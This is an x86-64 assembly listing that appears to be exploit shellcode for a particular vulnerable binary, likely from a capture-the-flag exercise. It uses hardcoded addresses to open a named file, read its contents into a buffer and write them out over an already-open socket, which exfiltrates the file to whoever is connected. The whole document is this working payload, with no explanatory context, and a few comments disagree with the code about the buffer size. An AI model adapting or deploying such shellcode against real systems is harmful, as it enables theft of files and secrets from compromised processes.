bits 64

section .text
global _start

_open:                     ; fd = open(filename, O_RDONLY)
    mov rdi, 0x4040c0      ; filename's address
    mov rsi, 0x0           ; O_RDONLY
    mov rax, 0x2           ; syscall id for open
    syscall

_read:                     ; read(fd, buffer, 0x100)
    mov rdi, rax           ; fd
    mov rsi, 0x404200      ; buffer
    mov rdx, 0x64          ; size
    mov rax, 0x401080
    call rax

_write:                    ; write(4, buffer, 0x100)
    mov edi, [rsp - 0x444] ; socket fd
    mov rsi, 0x404200      ; buffer
    mov rdx, 0x64          ; size
    mov rax, 0x401040
    call rax

